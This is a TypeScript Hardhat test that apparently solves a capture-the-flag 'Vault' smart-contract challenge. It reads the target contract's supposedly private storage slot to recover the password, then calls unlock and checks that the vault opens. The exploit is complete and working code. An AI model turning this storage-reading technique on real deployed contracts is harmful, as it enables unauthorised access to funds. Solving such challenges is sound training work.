import { ethers } from "hardhat";
import { expect } from "chai";


describe("vault", function() {
    it("should solve vault challenge", async function() {
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        let targetABI = [
            "function unlock(bytes32 _password) public",
            "function locked() public view returns (bool)",
        ];

        const targetAddr = "0x9b19bEb6d71B2b6300dbD5538958B382E505f0c5";
        let targetCont = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        targetCont = targetCont.connect(eoa);

        let lockedVal = await eoa.provider!.getStorageAt(targetAddr, 0);
        console.log(lockedVal);

        let password = await eoa.provider!.getStorageAt(targetAddr, 1);
        console.log(Buffer.from(password.slice(2), 'hex').toString());

        let tx = await targetCont.unlock(password);
        await tx.wait();
        console.log(tx);

        let locked = await targetCont.locked();
        expect(locked).to.be.false;
    });
});